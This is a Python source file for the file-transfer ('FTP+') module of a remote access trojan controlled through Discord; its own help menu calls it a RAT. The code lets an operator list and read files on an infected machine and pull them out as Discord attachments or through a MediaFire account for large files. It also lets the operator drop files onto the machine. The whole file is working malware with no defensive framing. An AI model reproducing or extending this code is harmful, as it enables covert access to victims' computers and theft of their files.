from shell.helpMenu import Menu, Command
from shell.tools import *
from mediafire.client import (MediaFireClient as mfClient, File as mfFile)
import discord, os

class FTPShell:
    def __init__(self, mainShell, mediafire=False) -> None:
        self.active = False
        self.hMenu = Menu({
            "help": Command("This **help menu**"),
            "author": Command("Some **info about the creator** of this RAT", (93, 0, 221)),
            "ping": Command("See if the RAT is running in this channel\n + Some small **latency info**", (34, 218, 25)),
            "pwd": Command("Get current working **directory**", (214, 210, 32)),
            "ls": Command("**list** **files** in directory (max 20)", (34, 214, 77), ["dir"]),
            "lsall": Command("**list all files** in directory", (34, 214, 77), ["dirall"]),
            "cd": Command("Navigate the **filesystem**", (101, 34, 214), usage="`cd <DIRECTORY`\n or `cd ..` to exit an directory"),
            "get": Command("**Download** a file from the client (max 8MB)", (50, 218, 27), ["download", "pull"], "`get <FILE_TO_DOWNLOAD>`"),
            "getbig": Command("**Download** a large file from the client (through mediafire)", (50, 218, 27), ["downloadbig", "pullbig"], "`getbig <FILE_TO_DOWNLOAD>`"),
            "put": Command("**Upload** a file to the client (max 8MB)", (227, 62, 26), ["upload", "give"], "`put <FILE_TO_UPLOAD>`"),
            "putbig": Command("**Upload** a large to the client (through mediafire)\nYou need to login to the configured medifire user, upload a file and set the URL as a local url for the file, ex. `mf:/UploadedFile.txt`", (227, 62, 26), ["uploadbig", "givebig"], "`putbig <URL_TO_FILE>`"),
            "cat": Command("**Preview** the contents of a file (first 300 chars)", (26, 60, 227), usage="`cat <FILE>`"),
            "exit": Command("**Exit** the **FTP+** shell", (224, 27, 27), ["quit", "bye"])
        })
        self.cwd = os.path.dirname(os.path.realpath(__file__))
        self.shell = mainShell
        self.mediafire = {"enabled":mediafire}
        if mediafire:
            self.mediafire["client"] = mfClient()
            self.mediafire["client"].login(email=self.shell.mediafire["email"], password=self.shell.mediafire["password"], app_id="42511")

    def format_path(self, pathToFormat: str) -> str:
        newDir = self.cwd
        if "/" == pathToFormat[0]:
            newDir = "/"
            dirs = pathToFormat[1:].split("/")
        elif "C:\\" == pathToFormat[:3]:
            newDir = "C:\\"
            dirs = pathToFormat[3:].split("/")
        elif "/" in pathToFormat:
            dirs = pathToFormat.split("/")
        else:
            dirs = pathToFormat.split("\\")
        for d in dirs:
            if d == "..":
                newDir = os.path.dirname(newDir)
            elif d != ".":
                newDir = os.path.join(newDir, d)
        return newDir
    
    def path_exists(self, path: str) -> bool:
        try:
            os.listdir(path)
            return True
        except:
            return False

    async def process(self, message, cmd: list) -> None:
        if cmd[0] == "ping":
            await message.reply("**Pong!** (from FTP+)")
        elif cmd[0] == "help":
            if len(cmd) > 1:
                await message.reply(embed=self.hMenu.displayForCommand(cmd[1]))
            else:
                await message.reply(embed=self.hMenu.display())
        elif cmd[0] == "pwd":
            await message.reply("`"+self.cwd+"`")
        elif cmd[0] == "cd":
            if len(cmd) > 1:
                newDir = self.format_path(" ".join(cmd[1:]))
                if self.path_exists(newDir):
                    self.cwd = newDir
                    await message.reply("`"+self.cwd+"`")
                else:
                    await message.reply("**Error:** The provided directory does **not exist** or you don't have **permission**.\n> The provided dir: `"+newDir+"`")
            else:
                await message.reply("**Usage:** `cd <DIRECTORY>`")
        elif cmd[0] in ["ls", "dir", "lsall", "dirall"]:
            path = self.cwd
            if len(cmd) > 1:
                path = self.format_path(" ".join(cmd[1:]))
            try:
                files = os.listdir(path)
            except:
                return await message.reply("**Error:** Unable to list files in directory `"+path+"`")
            formated = []
            for file in files:
                if os.path.isfile(os.path.join(path, file)):
                    formated.append(file)
                else:
                    formated.append("**__"+file+"__**")
            output = ", ".join(formated)
            if cmd[0] in ["ls", "dir"]:
                if len(files) > 20:
                    output += "\n + `"+str(len(files)-20)+"` more..."
                await message.reply(embed=discord.Embed(
                    title="📜 "+cmd[0].upper()+" 📜",
                    description=output,
                    color=discord.Color.from_rgb(31, 35, 207)
                ))
            else:
                await message.reply(output)
        elif cmd[0] == "cat":
            if len(cmd) > 1:
                filePath = self.format_path(" ".join(cmd[1:]))
                if os.path.exists(filePath):
                    f = open(filePath)
                    preview = f.read()[:300]
                    preview += "\n\n.... "+str(len(f.read())-300)+" more characters ...." if len(f.read()) > 300 else ""
                    f.close()
                    try:
                        await message.reply("**__Preview of "+filePath.split("/")[-1].split("\\")[-1]+"__:**\n\n"+preview)
                    except:
                        await message.reply("**Error:** There was an error while sending the data to discord...\n> The provided file: `"+filePath+"`")
                else:
                    await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
            else:
                await message.reply("**Usage:** `"+cmd[0]+" <FILE>`")
        elif cmd[0] in ["get", "download", "pull"]:
            if len(cmd) > 1:
                filePath = self.format_path(" ".join(cmd[1:]))
                if os.path.exists(filePath):
                    try:
                        await message.reply(file=discord.File(filePath))
                    except:
                        await message.reply("**Error:** The provided file is **too large** to download, max `8MB`\n> The provided file: `"+filePath+"`\n> Use `getbig <FILE>` to download large files (over 8MB)")
                else:
                    await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
            else:
                await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_DOWNLOAD>`")
        elif cmd[0] in ["getbig", "downloadbig", "pullbig"]:
            if self.mediafire["enabled"]:
                if len(cmd) > 1:
                    filePath = self.format_path(" ".join(cmd[1:]))
                    if os.path.isfile(filePath):
                        try:
                            self.mediafire["client"].upload_file(filePath, "mf:/")
                            for item in self.mediafire["client"].get_folder_contents_iter("mf:/"):
                                if item["filename"] == filePath.split("\\")[-1].split("/")[-1]:
                                    break
                            await message.reply("The provided file was **successfully uploaded** to mediafire and it is **ready for download**.\n> The provided file: `"+filePath+"`\n> Download URL: `"+item["links"]["normal_download"]+"`")
                        except:
                            await message.reply("**Error:** There was an **error* while uploading the file to mediafire.\n> The provided file: `"+filePath+"`")
                    else:
                        await message.reply("**Error:** The provided file does **not exist** or you don't have **permission**.\n> The provided file: `"+filePath+"`")
                else:
                    await message.reply("**Usage:** `"+cmd[0]+" <FILE_TO_DOWNLOAD>`")
            else:
                await message.reply("**Error:** In order to download large files, you need to have the **mediafire account** configured")
        elif cmd[0] in ["put", "upload", "give"]:
            if len(message.attachments) > 0:
                file = download_file(message.attachments[0].url)
                f = open(message.attachments[0].filename, 'wb')
                f.write(file)
                f.close()
                await message.reply("**Successfully** uploaded `"+message.attachments[0].filename+"` to the client")
            else:
                await message.reply("**Usage:** `"+cmd[0]+"` + attached file in message")
        elif cmd[0] in ["putbig", "uploadbig", "givebig"]:
            if self.mediafire["enabled"]:
                if len(cmd) > 1:
                    if "mf:/" == cmd[1][:4]:
                        filename = (" ".join(cmd[1:])).split("/")[-1]
                        self.mediafire["client"].download_file(" ".join(cmd[1:]), os.path.join(self.cwd, filename))
                        await message.reply("**Successfully** uploaded `"+filename+"` to the client\n> Provided file `"+" ".join(cmd[1:])+"`")
                    else:
                        await message.reply("**Error:** **Invalid URL** supplied, an local MediaFire url is required\n> Expected: `"+cmd[0]+" mf:/.....` (for more info `help "+cmd[0]+"`)")
                else:
                    await message.reply("**Usage:** `"+cmd[0]+" <MEDIAFIRE_URL>`")
            else:
                await message.reply("**Error:** In order to upload large files, you need to have the **mediafire account** configured")
        elif cmd[0] in ["exit", "quit", "bye"]:
            await message.reply("**Exiting** the FTP+ shell...")
            self.active = False
        else:
            await message.reply("**Invalid Command**")